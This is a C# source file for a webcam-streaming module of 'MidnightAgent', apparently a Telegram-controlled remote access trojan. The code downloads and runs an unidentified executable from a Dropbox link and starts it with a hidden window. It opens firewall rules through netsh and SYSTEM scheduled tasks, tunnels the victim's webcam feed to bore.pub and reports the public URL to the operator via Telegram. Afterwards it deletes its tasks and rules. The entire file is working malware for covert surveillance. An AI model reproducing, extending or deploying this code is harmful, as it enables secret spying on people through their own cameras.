using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    public class StreamCamFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "stream";
        public string Description => "Live Webcam Streaming (stream.exe + bore)";
        public string Usage => "/stream [duration_sec] [port] (Default: Infinite 5000)";

        // Dropbox Direct Link (dl=1) -> Updated by User
        private const string StreamToolUrl = "https://www.dropbox.com/scl/fi/7k2ymxwbqy42d55h9lb51/stream.exe?rlkey=9zlftrd5zsbunt33jh770z8kt&st=t90zmivm&dl=1";
        private const string BoreUrl = "https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-pc-windows-msvc.zip";

        private static System.Threading.CancellationTokenSource _cts;

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            // Handle Stop Command
            if (args.Length > 0 && args[0].Equals("stop", StringComparison.OrdinalIgnoreCase))
            {
                _cts?.Cancel();
                Cleanup();
                TelegramInstance?.SendMessage("🛑 <b>Streaming stopped and cleaned up.</b>");
                return FeatureResult.Ok("Stopped.");
            }

            // Cancel previous if running
            _cts?.Cancel();
            _cts = new System.Threading.CancellationTokenSource();
            var token = _cts.Token;

            try
            {
                int duration = 0;   // Default Infinite
                int port = 5000;    // Default Port

                if (args.Length > 0 && int.TryParse(args[0], out int d)) duration = d;
                if (args.Length > 1 && int.TryParse(args[1], out int p)) port = p;

                string workDir = @"C:\Users\Public\StreamTool";
                if (!Directory.Exists(workDir)) Directory.CreateDirectory(workDir);

                string streamExe = Path.Combine(workDir, "stream.exe");
                string boreExe = Path.Combine(workDir, "bore.exe");

                // 1. Download Tools
                using (var client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("User-Agent", "MidnightAgent");
                    
                    if (File.Exists(streamExe)) File.Delete(streamExe); // Always refresh

                    if (!File.Exists(streamExe))
                    {
                        TelegramInstance?.SendMessage("⬇️ <b>Downloading Stream Tool...</b>");
                        try 
                        {
                            var bytes = await client.GetByteArrayAsync(StreamToolUrl);
                            File.WriteAllBytes(streamExe, bytes);
                        }
                        catch (Exception ex) { return FeatureResult.Fail($"❌ Download Failed: {ex.Message}"); }
                    }

                    if (!File.Exists(boreExe))
                    {
                        string boreZip = Path.Combine(workDir, "bore.zip");
                        try
                        {
                             var bytes = await client.GetByteArrayAsync(BoreUrl);
                             File.WriteAllBytes(boreZip, bytes);
                             System.IO.Compression.ZipFile.ExtractToDirectory(boreZip, workDir);
                             File.Delete(boreZip);
                        }
                        catch { }
                    }
                }

                if (!File.Exists(streamExe)) return FeatureResult.Fail("❌ Missing stream.exe");
                if (!File.Exists(boreExe)) return FeatureResult.Fail("❌ Missing bore.exe");

                // 2. Kill Previous Instances
                Cleanup();

                // 3. Add Firewall Rule
                bool isSystem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;
                if (isSystem)
                {
                    RunSchTasks($"/Create /TN \"MidnightFW\" /TR \"netsh advfirewall firewall add rule name=\\\"MidnightStream\\\" dir=in action=allow program=\\\"{streamExe}\\\" enable=yes\" /SC ONCE /ST 00:00 /RI 1 /IT /RU SYSTEM /F");
                    RunSchTasks("/Run /TN \"MidnightFW\"");
                    await Task.Delay(2000, token);
                    RunSchTasks("/Delete /TN \"MidnightFW\" /F");
                }

                // 4. Start Stream Tool
                var psiStream = new ProcessStartInfo 
                { 
                    FileName = streamExe, 
                    Arguments = $"-port {port}",
                    CreateNoWindow = true, 
                    WindowStyle = ProcessWindowStyle.Hidden, // Hide Window
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };



                if (isSystem)
                {
                    TelegramInstance?.SendMessage($"🔒 <b>Starting Streamer (Port {port})...</b>");
                    string taskName = "MidnightStream";
                    RunSchTasks($"/Delete /TN \"{taskName}\" /F");
                    string createArgs = $"/Create /TN \"{taskName}\" /TR \"'{streamExe}' -port {port}\" /SC ONCE /ST 00:00 /RI 1 /IT /RU Users /F";
                    RunSchTasks(createArgs);
                    RunSchTasks($"/Run /TN \"{taskName}\"");

                }
                else
                {
                    try {
                        Process.Start(new ProcessStartInfo {
                            FileName = "netsh",
                            Arguments = $"advfirewall firewall add rule name=\"MidnightStream\" dir=in action=allow program=\"{streamExe}\" enable=yes",
                            CreateNoWindow = true,
                            UseShellExecute = false
                        }).WaitForExit();
                    } catch {}

                    var pStream = Process.Start(psiStream);
                    _ = Task.Run(async () => {
                        try { 
                            while (!pStream.StandardOutput.EndOfStream) {
                                string line = await pStream.StandardOutput.ReadLineAsync();
                            }
                        } catch {}
                    });
                    _ = Task.Run(async () => {
                        try { while (!pStream.StandardError.EndOfStream) await pStream.StandardError.ReadLineAsync(); } catch {}
                    });
                }

                await Task.Delay(3000, token);

                // CHECK PORT
                bool portOpen = false;
                try
                {
                    using (var tcp = new System.Net.Sockets.TcpClient())
                    {
                        var connectTask = tcp.ConnectAsync("127.0.0.1", port);
                        if (await Task.WhenAny(connectTask, Task.Delay(2000, token)) == connectTask)
                            portOpen = tcp.Connected;
                    }
                }
                catch { }

                if (!portOpen)
                {
                    Cleanup();
                    return FeatureResult.Fail($"❌ Streamer failed to open port {port}.");
                }

                TelegramInstance?.SendMessage($"✅ <b>Streamer OK (Port {port}). Starting Tunnel...</b>");

                // 5. Start Tunnel
                ProcessStartInfo psiBore = new ProcessStartInfo
                {
                    FileName = boreExe,
                    Arguments = $"local {port} --to bore.pub",
                    WorkingDirectory = workDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                var boreLogs = new System.Text.StringBuilder();
                var tcsUrl = new TaskCompletionSource<string>();
                
                using (var pBore = new Process { StartInfo = psiBore, EnableRaisingEvents = true })
                {
                    pBore.OutputDataReceived += (sender, e) => {
                        if (!string.IsNullOrEmpty(e.Data)) {
                            boreLogs.AppendLine($"[OUT] {e.Data}");
                            if (e.Data.Contains("bore.pub")) {
                                var match = Regex.Match(e.Data, @"bore\.pub:\d+");
                                if (match.Success) tcsUrl.TrySetResult("http://" + match.Value);
                            }
                        }
                    };
                    pBore.ErrorDataReceived += (sender, e) => { if (!string.IsNullOrEmpty(e.Data)) boreLogs.AppendLine($"[ERR] {e.Data}"); };
                    pBore.Exited += (sender, e) => { tcsUrl.TrySetException(new Exception($"Bore exited (Code: {pBore.ExitCode})")); };

                    pBore.Start();
                    pBore.BeginOutputReadLine();
                    pBore.BeginErrorReadLine();

                    TelegramInstance?.SendMessage("⏳ Waiting for public URL...");
                    
                    var completedTask = await Task.WhenAny(tcsUrl.Task, Task.Delay(30000, token)); // Wait URL with Cancel support
                    
                    if (completedTask == tcsUrl.Task)
                    {
                        string publicUrl = await tcsUrl.Task; 
                        TelegramInstance?.SendMessage($"🔴 <b>LIVE STREAM</b>\nURL: {publicUrl}\n(Use '/stream stop' to end)");
                        
                        // Wait user stop
                        if (duration <= 0) await Task.Delay(-1, token);
                        else await Task.Delay(duration * 1000, token);
                    }
                    else
                    {
                        TelegramInstance?.SendMessage($"❌ Tunnel Timeout/Fail. Logs:\n{boreLogs}");
                    }
                }

                return FeatureResult.Ok("Streaming ended.");
            }
            catch (TaskCanceledException)
            {
                return FeatureResult.Ok("Streaming stopped by user.");
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Error: {ex.Message}");
            }
            finally
            {
                Cleanup();
            }
        }

        private void Cleanup()
        {
            try { RunSchTasks("/Delete /TN \"MidnightStream\" /F"); } catch {}
            try { RunSchTasks("/Delete /TN \"MidnightFW\" /F"); } catch {}
            try { Process.Start("taskkill", "/F /IM stream.exe"); } catch {}
            try { Process.Start("taskkill", "/F /IM bore.exe"); } catch {}
            try { 
                    Process.Start(new ProcessStartInfo {
                    FileName = "netsh", 
                    Arguments = "advfirewall firewall delete rule name=\"MidnightStream\"",
                    CreateNoWindow = true, 
                    UseShellExecute = false
                }).WaitForExit();
            } catch {}
        }

        private string RunSchTasks(string args)
        {
            try
            {
                var p = new Process
                {
                    StartInfo = new ProcessStartInfo 
                    { 
                        FileName = "schtasks", 
                        Arguments = args, 
                        UseShellExecute = false, 
                        CreateNoWindow = true, 
                        RedirectStandardOutput = true 
                    }
                };
                p.Start();
                string o = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return o;
            }
            catch { return ""; }
        }
    }
}
